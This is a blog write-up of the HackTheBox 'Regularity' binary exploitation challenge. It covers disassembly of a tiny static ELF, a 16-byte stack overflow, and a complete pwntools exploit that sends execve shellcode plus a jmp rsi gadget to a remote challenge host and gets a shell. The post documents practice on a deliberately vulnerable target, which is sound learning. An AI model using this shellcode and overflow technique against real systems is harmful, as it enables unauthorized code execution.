---
layout: post
title: Binary Exploitation&#58; HacktheBox/regularity
---

## HacktheBox: Regularity - Write-up

This is a "very easy" challenge in HacktheBox's VIP pwn challenges. It is a basic shellcode+single gadget exploit.

### Reversing

First, we check the filetype:
```
regularity: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, not stripped
```
We are dealing with a statically linked ELF with debugging symbols and no PIE.

Next, let's check the securities:
```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   13) Symbols	  No	0		0		regularity
```
No canary, no pie, AND an executable stack! We have many avenues for attack with this one.

Running the file, we get some basic output and are prompted for input.
```
Hello, Survivor. Anything new these days?
hello
Yup, same old same old here as well...
```
Since the file is statically linked and the file size is small, I am going to assume this is an exceptinally small binary that we can probably take a peek at with objdump.
```
jake@jake-VirtualBox:~/hackthebox/pwn/regularity/pwn_regularity$ objdump -M intel -d regularity 

regularity:     file format elf64-x86-64


Disassembly of section .text:

0000000000401000 <_start>:
  401000:	bf 01 00 00 00       	mov    edi,0x1
  401005:	48 be 00 20 40 00 00 	movabs rsi,0x402000
  40100c:	00 00 00 
  40100f:	ba 2a 00 00 00       	mov    edx,0x2a
  401014:	e8 2a 00 00 00       	call   401043 <write>
  401019:	e8 2d 00 00 00       	call   40104b <read>
  40101e:	bf 01 00 00 00       	mov    edi,0x1
  401023:	48 be 2a 20 40 00 00 	movabs rsi,0x40202a
  40102a:	00 00 00 
  40102d:	ba 27 00 00 00       	mov    edx,0x27
  401032:	e8 0c 00 00 00       	call   401043 <write>
  401037:	48 be 6f 10 40 00 00 	movabs rsi,0x40106f
  40103e:	00 00 00 
  401041:	ff e6                	jmp    rsi

0000000000401043 <write>:
  401043:	b8 01 00 00 00       	mov    eax,0x1
  401048:	0f 05                	syscall 
  40104a:	c3                   	ret    

000000000040104b <read>:
  40104b:	48 81 ec 00 01 00 00 	sub    rsp,0x100
  401052:	b8 00 00 00 00       	mov    eax,0x0
  401057:	bf 00 00 00 00       	mov    edi,0x0
  40105c:	48 8d 34 24          	lea    rsi,[rsp]
  401060:	ba 10 01 00 00       	mov    edx,0x110
  401065:	0f 05                	syscall 
  401067:	48 81 c4 00 01 00 00 	add    rsp,0x100
  40106e:	c3                   	ret    

000000000040106f <exit>:
  40106f:	b8 3c 00 00 00       	mov    eax,0x3c
  401074:	31 ff                	xor    edi,edi
  401076:	0f 05                	syscall 
```
The first thing I notice is the lack of function prologues and epilogues. This allows us to use the same stack frame throughout the program's lifetime. 

The binary employs wrappers for the ```write``` and ```read``` syscalls. It looks like that we have a pretty standard buffer overflow in the ```read``` function.
```
  40104b:       48 81 ec 00 01 00 00    sub    rsp,0x100
  401052:       b8 00 00 00 00          mov    eax,0x0
  401057:       bf 00 00 00 00          mov    edi,0x0
  40105c:       48 8d 34 24             lea    rsi,[rsp]
  401060:       ba 10 01 00 00          mov    edx,0x110
  401065:       0f 05                   syscall
  401067:       48 81 c4 00 01 00 00    add    rsp,0x100
  40106e:       c3                      ret
```
First, ```0x100``` bytes are allocated on the stack. Then, we see the registers get setup for a call to ```read```. The authors of the challenge were extremely nice and set the address of the buffer to be read into as the top of the stack. Finally, we see that ```read``` is going to read ```0x110``` bytes into the stack, which means we have 16 bytes of overflow. The next thing to notice is that ```0x100``` bytes are added to the stack followed by a ```ret``` instruction. Since ```ret``` pops the first value off the stack and jumps to that address, we can control execution with ```0x100``` bytes followed by a 8 byte address we want to execute from.

### Pwn

Since we don't see any interesting functions and the stack is executable, let's see if there is a way we can jump to somewhere in our input. If we use ```ropper```, we see that there is a ```jmp rsi``` gadget we can use.
```
0x0000000000401041: jmp rsi; 
```
Since ```rsi``` should be the start of our input, have ```0x100``` bytes of shellcode to work with followed by the address of our ```jmp rsi``` gadget.

Let's put together some basic ```execve``` shellcode that we can use. 
```asm
global main
section .text

main:
	xor rdx, rdx
	push rdx
	mov rbx, 0x68732f2f6e69622f
	push rbx
	mov rdi, rsp
	push 0
	mov rsi, rsp
	mov rax, 59
	syscall
	xor rdi, rdi
	mov rax, 60
	syscall
```
First, we zero out ```rdx``` which is the third argument of ```execve``` (the environment parameter). Next, we push rdx onto the stack to serve as the null terminator for the string we want to push. Next, we move ```0x68732f2f6e69622f``` into ```rbx``` which is the string "/bin//sh" in reverse order. We push that onto the stack and move the address of that string into ```rdi``` which is the first argument for ```execve```. To setup the second parameter (the argv array), we push 0 onto the stack and move the address of the null terminator into ```rsi```. Finally, we move ```0x59``` (the syscall number for ```execve```) into rax and invoke ```syscall```. Note: Since we had extra space, I went ahead and included a call to ```exit``` to ensure that if whatever reason the shellcode fails, the program exits normally.

With our shellcode made, we can assemble it, convert it to a raw binary, and transform the bytes into printable characters to be used in our exploit.
```
jake@jake-VirtualBox:~/hackthebox/pwn/regularity/pwn_regularity$ nasm -f elf64 shellcode.asm
jake@jake-VirtualBox:~/hackthebox/pwn/regularity/pwn_regularity$ objcopy -O binary shellcode.o shellcode
jake@jake-VirtualBox:~/hackthebox/pwn/regularity/pwn_regularity$ xxd -p shellcode | tr -d '\n' | sed 's/\(..\)/\\x\1/g' | fold -w 32
```
Now we just need to make the exploit:
```python
#!/usr/bin/env python3

from pwn import *

e = context.binary = "./regularity"
context.arch = "amd64"

jmp_rsi = 0x0000000000401041

shellcode = b'\x48\x31\xd2\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x6a\x00\x48\x89\xe6\xb8\x3b\x00\x00\x00\x0f\x05\x48\x31\xff\xb8\x3c\x00\x00\x00\x0f\x05'

payload = shellcode + b'A'*(0x100 - len(shellcode)) + p64(jmp_rsi)
#p = gdb.debug('./regularity', '''
#                start
#                ''')
#p = process(e)
p = remote('94.237.49.3', 30698)

p.recvline()
p.sendline(payload)
p.interactive()
```
Our exploit builds the payload by starting with our shellcode followed by the correct number of ```A```'s to reach our return address followed by the address of ```jmp rsi```.

Running this exploit gives us a shell which allows us to ```cat``` out the flag!
```
jake@jake-VirtualBox:~/hackthebox/pwn/regularity/pwn_regularity$ python3 exploit.py 
[*] '/home/jake/hackthebox/pwn/regularity/pwn_regularity/regularity'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
[+] Opening connection to 94.237.49.3 on port 30698: Done
[*] Switching to interactive mode
$ ls
flag.txt
regularity
$  
```

Et Voila!
